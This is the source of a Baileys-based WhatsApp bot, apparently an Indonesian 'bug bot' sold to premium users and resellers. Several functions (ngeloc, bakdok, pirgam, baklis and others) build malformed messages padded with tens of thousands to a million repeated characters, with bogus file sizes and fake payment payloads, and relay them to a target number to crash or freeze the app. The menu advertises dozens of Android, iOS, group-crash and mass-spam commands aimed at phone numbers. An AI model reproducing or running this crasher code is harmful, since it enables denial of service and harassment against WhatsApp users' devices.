require('./config')
const {
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
//=================================================//
const { ryozingodConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')
//=================================================//
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
//=================================================//
// Disini Ada Beberapa Modul Yg Udh kg gw Pake, lu Hapus Sendiri Aj 🚬🗿
const axios = require('axios')
const os = require('os').cpus().length
const util = require('util')
const urll = require('url')
const jimp = require('jimp')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const pino = require('pino')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const dgram = require('dgram')
const fg = require('api-dylux')
const cheerio = require('cheerio')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const FormData = require('form-data')
const ms = toMs = require('ms')
const crypto = require("crypto")
const yts = require("yt-search")
const tls = require('tls')
const net = require('net')
const http2 = require('http2')
const cluster = require('cluster')
const { color } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { remini } = require('./lib/remini')
const { toPTT, toAudio } = require("./lib/converter")
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const sockett = dgram.createSocket('udp4')
const bochil = require("@bochilteam/scraper")
const fakeUA = require('fake-useragent')
const randomUA = fakeUA().toString()
const fs = require('fs')
//=================================================//
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./lib/premiun')
let afk = require("./lib/afk") //afk


//=================================================//
module.exports = ryozingod = async (ryozingod, m, chatUpdate, store) => {
try {
var body = (
m.mtype === 'conversation' ? m.message.conversation :
m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === 'messageContextInfo' ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
''
);

//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await ryozingod.decodeJid(ryozingod.user.id)
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync('./dtbs/premium.json'))
const kontributor = JSON.parse(fs.readFileSync('./dtbs/owner.json'))
const iniseller = JSON.parse(fs.readFileSync('./dtbs/seller.json'))
const contacts = JSON.parse(fs.readFileSync("./dtbs/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isDeveloper || isDeveloper || checkPremiumUser(m.sender, orgkaya);

// Group
const groupMetadata = m.isGroup ? await ryozingod.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

//=================================================//
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== 'object') db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {
}
//=================================================//
const setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
//    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
            if (!('autoread' in setting)) setting.autoread = true
            if (!('autoTyping' in setting)) setting.autoTyping = false
            if (!('autoRecord' in setting)) setting.autoRecord = false
//        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
//        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else db.data.settings[botNumber] = {
//    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoTyping: false,
//    		auto_ai_grup: true,
//    		goodbye: true,
    		onlygrub: false,
//        welcome: true, 
    		autoread: true,
    		menuType: 'externalImage' //> buttonImage
	    }

} catch (err) {
console.error(err)
}
//=================================================//
const nulll = fs.readFileSync(`./image/nulll.jpg`)
const nulll2 = fs.readFileSync(`./image/nulll2.jpg`)
const mengkece = fs.readFileSync(`./image/mengkece.jpg`)
const latx = fs.readFileSync(`./image/latx.png`)
const fakedoc = fs.readFileSync(`./src/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
//=================================================//
const scp1 = require('./lib/scraper.js') 
//=================================================//
const { ios } = require("./virtex/ios.js")
//=================================================//
if (!m.key.fromMe && db.data.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await ryozingod.readMessages([readkey]);
}
ryozingod.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
ryozingod.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
ryozingod.sendPresenceUpdate('recording', m.chat)
}
}
if (db.data.settings[botNumber].autobio) {
let setting = db.data.settings[botNumber]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
await ryozingod.updateProfileStatus(`✳️ . || ✅ Runtime : ${uptime}`)
setting.status = new Date() * 1
}
}
//=================================================//
//Status
if (!ryozingod.public) {
if (!m.key.fromMe) return
} 

//=================================================//
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}





//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "💀 .",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - .`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - .',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` . ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ . 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ . 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}
//=================================================//
//Reply
const joreply = async (teks) => {
await sleep(500)
let thumbnails = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return ryozingod.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `©.`,
body: `👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://`,
mediaUrl: `https://`
}
},
text: teks
}, {
quoted: m
})
await sleep(500)
}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: kuwoted })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await ryozingod.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰.ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #lexgoddominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐋𝐞𝐗𝐜𝐙 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return joreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}

//=================================================//
switch (command) {
// Status
case 'public': {
if (!isPremium) return joreply(mess.premium) 
ryozingod.public = true
joreply('succes')
}
break
//=================================================//
case 'clearchat': {
pee = "\n".repeat(200)
joreply(pee + '😁🖕')
}
break
//=================================================//
//Menu
case "menu": {

let njing = `

> ┏❐  ⌜ About ⌟  ❐
> ┃⭔ Creator : 𝐋𝐞𝐗𝐜𝐙
> ┃⭔ Library : WS-Baileys
> ┃⭔ Type : Case
> ┃⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
> ┃⭔ User : ${Object.keys(db.data.users).length}
> ┗❐

> ┏❐   \`*OWNER CMD*\` 
> ┃
> ┃⭔ addakses 62##/TAG 30d
> ┃⭔ delakses 62##/TAG 30d
> ┃⭔ changemenu button/non
> ┃⭔ autoread on/off
> ┃⭔ autotyping on/off
> ┃⭔ autorecord on/off
> ┃⭔ autobio on/off
> ┃⭔ self
> ┃⭔ public
> ┃⭔ shutdown
> ┃⭔ addcase 
> ┃⭔ delcase
> ┃⭔ join [link group]
> ┃⭔ block [nomor]
> ┃⭔ unblock [nomor]
> ┃⭔ listblock
> ┃⭔ setppbot [reply gambar]
> ┃⭔ setbiobot [teks]
> ┃⭔ listpc
> ┃
> ┗❐

> ┏❐  \`*BUG GROUP*\`
> ┃
> ┃⭔ bug-button link group
> ┃⭔ bug-browser link group
> ┃⭔ bug-gc 120###@g.us
> ┃⭔ penghitaman 120###@g.us
> ┃⭔ bug-ganas link group
> ┃⭔ bug-entod link group
> ┃⭔ bug-ewe link group
> ┃⭔ bug-coli link group
> ┃⭔ bug-suki link group
> ┃⭔ bug-gcbom link group
> ┃⭔ bug-gcmawar link group
> ┃⭔ bug-gcexploit link group
> ┃
> ┗❐

> ┏❐  \`*BUG SPAM*\`
> ┃
> ┃⭔ bijiloe 62877###|jumlah
> ┃⭔ ajimale 62877###|jumlah
> ┃⭔ riper 62877###|jumlah
> ┃⭔ guru 62877###|jumlah
> ┃⭔ kepsek 62877###|jumlah
> ┃⭔ ipa 62877###|jumlah
> ┃⭔ ips 62877###|jumlah
> ┃⭔ penjas 62877###|jumlah
> ┃⭔ lexspam 62877###|jumlah
> ┃⭔ lexngocok 62877###|jumlah
> ┃⭔ lexkentut 62877###|jumlah
> ┃⭔ lexberak 62877###|jumlah
> ┃⭔ lexcoli 62877###|jumlah
> ┃⭔ asuu 62877###|jumlah
> ┃⭔ temble 62877###|jumlah
> ┃⭔ kursi 62877###|jumlah
> ┃⭔ lexalok 62877###|jumlah
> ┃⭔ lexbarbar 62877###|jumlah
> ┃⭔ lexdangdut 62877###|jumlah
> ┃⭔ lexganas 62877###|jumlah
> ┃⭔ lexcok 62877###|jumlah
> ┃
> ┗❐

> ┏❐  \`*BUG ANDRO*\`
> ┃
> ┃⭔ bijiloe 62877###|jumlah
> ┃⭔ ajimale 62877###|jumlah
> ┃⭔ prikitiw 62877###
> ┃⭔ sipilist 62877###
> ┃⭔ 1hit 62877###
> ┃⭔ 1shoot 62877###
> ┃⭔ mimir 62877###
> ┃⭔ fatal-notif 62877###
> ┃⭔ fatal-ui 62877###
> ┃⭔ crash-total 62877###
> ┃⭔ forces-sql 62877###
> ┃⭔ bug-rom 62877###
> ┃⭔ restart-ui 62877###
> ┃⭔ zero-bug 62877###
> ┃⭔ bug-s 62877###
> ┃⭔ virg4m 62877###
> ┃⭔ crashganas 62877###
> ┃⭔ bug-24j 62877###
> ┃⭔ gada-ampun 62877###
> ┃⭔ samsung-chace 62877###
> ┃⭔ samsung-24j 62877###
> ┃⭔ rog 62877###
> ┃⭔ coli 62877###
> ┃⭔ kentang 62877###
> ┃⭔ revankontol 62877###
> ┃⭔ ewe 62877###
> ┃⭔ nokia123 62877###
> ┃⭔ bug-recover 62877###
> ┃⭔ not-human 62877###
> ┃⭔ impossible 62877###
> ┃⭔ shock 62877###
> ┃⭔ wave 62877###
> ┃⭔ surprise 62877###
> ┃⭔ lexunlimited 62877###
> ┃
> ┗❐

> ┏❐  \`*BUG IOS*\`
> ┃
> ┃⭔ vios-unli 62877###
> ┃⭔ ios-kentang 62877###
> ┃⭔ ios-virus 62877###
> ┃⭔ ios24j 62877###
> ┃⭔ nonstop 62877###
> ┃⭔ visible 62877###|waktu
> ┃⭔ ios-alok 62877###|waktu
> ┃⭔ ios-kelli 62877###|waktu
> ┃⭔ bug-ipong 62877###|waktu
> ┃⭔ bug-ios 62877###|waktu
> ┃⭓ #masukkan waktu 1 = 200 detik
> ┃⭓ #cek id = ketik .cekidgc
> ┃
> ┗❐

> ┏❐  \`*BUG EMOJI*\`
> ┃
> ┃⭔ 🗿 62877######
> ┃⭔ 🌷 62877######
> ┃⭔ 🐑 62877######
> ┃⭔ 🥰 62877######
> ┃⭔ 😈 62877######
> ┃⭔ 😂 62877######
> ┃⭔ 😭 62877######
> ┃⭔ 🙀 62877######
> ┃⭔ 🤪 62877######
> ┃⭔ 🥶 62877######
> ┃⭔ 💀 62877######
> ┃⭔ ☠️ 62877######
> ┃⭔ 👿 62877######
> ┃⭔ 🤡 62877######
> ┃
> ┗❐

> ┏❐  \`*BUG BOT* {khusus nomor bot}\`
> ┃
> ┃⭔ bgtes jumlah
> ┃⭔ bugpenis jumlah
> ┃⭔ bugpepek jumlah
> ┃⭔ plerku jumlah
> ┃⭔ null-chace jumlah
> ┃⭔ 200k jumlah
> ┃⭔ 300k
> ┃⭔ 500k jumlah
> ┃⭔ senggol
> ┃⭔ bgtes2 jumlah
> ┃
> ┗❐

> 𝐋𝐞𝐗𝐜𝐙 © Copyright`
let kontollurus = {
image: mengkece,
caption: njing
};


if ( db.data.settings[botNumber].menuType === 'externalImage') {
ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
}
}
break
//=================================================//
case 'ping': {
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
penis = fs.readFileSync("./ryozingod.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ ');

joreply(`
┏❐  ⌜ About ⌟  ❐
┃⭔ Creator : 𝐋𝐞𝐗𝐜𝐙
┃⭔ Library : WS-Baileys
┃⭔ Type : Case
┃⭔ Status : Ready 
┃⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Resp Speed : ${latensi.toFixed(4)}
